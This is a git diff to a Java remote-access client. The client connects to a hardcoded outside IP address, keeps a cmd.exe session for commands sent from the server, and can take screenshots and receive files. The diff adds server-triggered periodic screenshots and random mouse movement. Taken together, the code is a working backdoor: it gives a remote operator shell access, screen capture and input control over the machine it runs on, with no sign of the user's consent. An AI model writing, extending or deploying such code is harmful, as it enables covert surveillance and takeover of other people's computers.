@@ -1,6 +1,8 @@
 package clientTest;
 
 
+import java.awt.AWTException;
+import java.awt.Dimension;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
@@ -21,18 +23,20 @@ import java.net.Socket;
 import java.nio.CharBuffer;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.Random;
 
 import javax.imageio.ImageIO;
 import javax.sound.sampled.AudioInputStream;
 import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.Clip;
 
-public class client {
+public class Client {
 	
 	// Server data
 	static String ip = "89.40.116.15";
 	static int port = 6655;
 	
+	// ms to wait between requests to server
 	static int connectTimer = 5000;
 	
 	// Connection variables
@@ -44,6 +48,14 @@ public class client {
 	
 	// cmd process
 	static Process cmd;
+	
+	// autoScreenshot Thread
+	static Thread aSS;
+	static boolean aSS_active = false;
+	
+	// mouseMove Thread
+	static Thread mM;
+	static boolean mM_active = false;
 
 	public static void main(String[] args) {
 		
@@ -51,11 +63,7 @@ public class client {
 		connectToServer();
 		
 		// Start cmd process
-		try {
-			cmd = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
-		} catch (IOException e1) {
-			e1.printStackTrace();
-		}
+		startCmd();
 		
 		// Wait for command from server
 		System.out.println("Waiting for command...");
@@ -86,11 +94,134 @@ public class client {
 			case "sound":
 				sound();
 				break;
+			case "autoscreenshot":
+				autoScreenshot();
+				break;
+			case "movemouse":
+				moveMouse();
+				break;
 			case "exit":
 				safeExit();
 				break;
 			}
 		}
+	}
+	
+	// Moves mouse to random position once or continuously
+	private static void moveMouse() {
+		
+		// Read timer
+		int timer, timerTemp;
+		try {
+			timerTemp = in.readInt();
+		} catch (Exception e) {
+			connectToServer();
+			return;
+		}
+		
+		// Deactivate mouseMove
+		if (timerTemp == 0) {
+			mM_active = false;
+			return;
+		}
+		
+		// Check if already running
+		if (mM_active) return;
+		
+		// Check for dangerous timer
+		if (timerTemp < 1000 && timerTemp != 1) return;
+		
+		timer = timerTemp;
+		mM_active = true;
+		
+		// Create thread to move mouse
+		mM = new Thread("MouseMove") {
+			public void run() {
+				
+				Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+				int maxX = (int) screenSize.getWidth();
+				int maxY = (int) screenSize.getHeight();
+				
+				Random random = new Random();
+				Robot mouseRobot;
+				try {
+					mouseRobot = new Robot();
+				} catch (AWTException e1) {
+					e1.printStackTrace();
+					mM_active = false;
+					return;
+				}
+				
+				while(mM_active) {
+					if (timer == 1) mM_active = false;
+					mouseRobot.mouseMove(random.nextInt(maxX), random.nextInt(maxY));
+					try {
+						Thread.sleep(timer);
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+						mM_active = false;
+						return;
+					}	
+					System.out.println("...Mooved Mouse...");
+				}
+			}
+		};
+		mM.start();
+		
+	}
+
+
+	// start cmd session
+	private static void startCmd() {
+		try {
+			cmd = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+	
+	
+	// Start/stop taking screenshots in given interval
+	private static void autoScreenshot() {
+		
+		// Read timer
+		int timer, timerTemp;
+		try {
+			timerTemp = in.readInt();
+		} catch (Exception e) {
+			connectToServer();
+			return;
+		}
+		
+		// Deactivate autoScreenshot
+		if (timerTemp == 0) {
+			aSS_active = false;
+			return;
+		}
+		
+		// Check if already running or for dangerous timer
+		if (aSS_active || timerTemp < 1000) return;
+		
+		timer = timerTemp;
+		aSS_active = true;
+		
+		// Create thread to take screenshots
+		aSS = new Thread("AutoScreenshot") {
+			public void run() {
+				while(aSS_active) {
+					screenshot();
+					try {
+						Thread.sleep(timer);
+					} catch (InterruptedException e) {
+						e.printStackTrace();
+						aSS_active = false;
+						return;
+					}	
+					System.out.println("...Took screenshot...");
+				}
+			}
+		};
+		aSS.start();
 	}
 	
 	
@@ -120,14 +251,14 @@ public class client {
 	}
 
 	
-	// Save a screenshot as "MMDDHHmm"
+	// Save a screenshot as "dd_hh_mm_ss"
 	private static void screenshot() {
 		
 		// Save current DateTime
 		Date date = new Date();
 		
 		// Create format
-		SimpleDateFormat ft = new SimpleDateFormat ("MMddhhmm");
+		SimpleDateFormat ft = new SimpleDateFormat ("dd'_'hh'_'mm'_'ss");
 		
 		// Take screenshot and save with formatted DateTime as filename
 		try {
@@ -223,6 +354,7 @@ public class client {
 		System.out.println("File recieved!");
 	}
 	
+	
 	// Execute cmd commands
 	private static void cmdCommand() {	
 		
@@ -313,6 +445,7 @@ public class client {
 		}
 		System.out.println("Connected!");
 	}
+	
 	
 	// Disconnect before exiting program
 	private static void safeExit() {
